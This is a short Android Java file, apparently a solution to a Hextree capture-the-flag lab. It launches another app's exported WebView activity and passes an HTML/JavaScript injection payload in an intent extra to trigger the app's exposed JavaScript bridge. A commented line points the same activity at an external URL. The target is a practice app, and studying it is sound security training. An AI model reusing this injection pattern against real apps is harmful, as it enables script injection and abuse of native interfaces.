package niraj.patali.exposenativefunctionalitytothewebview;

import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Intent intent = new Intent();
        intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.webviews.Flag39WebViewsActivity");
        intent.putExtra("NAME","</b><button onclick='hextree.success()'>Button</button>");
//        intent.putExtra("URL","https://aqua-linzy-4.tiiny.site");
        startActivity(intent);
    }
}
